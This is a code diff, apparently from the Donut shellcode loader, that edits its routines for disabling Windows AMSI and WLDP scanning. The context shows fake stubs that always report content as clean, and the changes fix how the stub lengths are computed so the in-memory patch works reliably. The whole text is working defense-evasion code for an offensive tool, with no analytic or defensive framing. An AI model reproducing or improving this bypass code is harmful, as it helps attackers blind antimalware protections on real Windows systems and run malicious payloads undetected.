@@ -62,7 +62,9 @@ HRESULT WINAPI AmsiScanBufferStub(
     return S_OK;
 }
 
-VOID AmsiScanBufferStubEnd(int a) {}
+int AmsiScanBufferStubEnd(int a, int b) {
+    return a * b;
+}
 
 // fake function that always returns S_OK and AMSI_RESULT_CLEAN
 HRESULT WINAPI AmsiScanStringStub(
@@ -74,6 +76,10 @@ HRESULT WINAPI AmsiScanStringStub(
 {
     *result = AMSI_RESULT_CLEAN;
     return S_OK;
+}
+
+int AmsiScanStringStubEnd(int a, int b) {
+    return a + b;
 }
 
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
@@ -114,7 +120,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
-    len = (ULONG_PTR)DisableAMSI -
+    len = (ULONG_PTR)AmsiScanStringStubEnd -
           (ULONG_PTR)AmsiScanStringStub;
      
     DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
@@ -264,7 +270,9 @@ HRESULT WINAPI WldpIsClassInApprovedListStub(
 
 // make sure prototype is different from other null subroutines
 // to avoid duplication by MSVC
-VOID WldpIsClassInApprovedListStubEnd(int a, int b) {}
+int WldpIsClassInApprovedListStubEnd(int a, int b) {
+  return a - b;
+}
 
 // fake function that always returns S_OK
 HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
@@ -275,7 +283,9 @@ HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
     return S_OK;
 }
 
-VOID WldpQueryDynamicCodeTrustStubEnd(int a, int b, int c) {}
+int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
+  return a / b;
+}
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
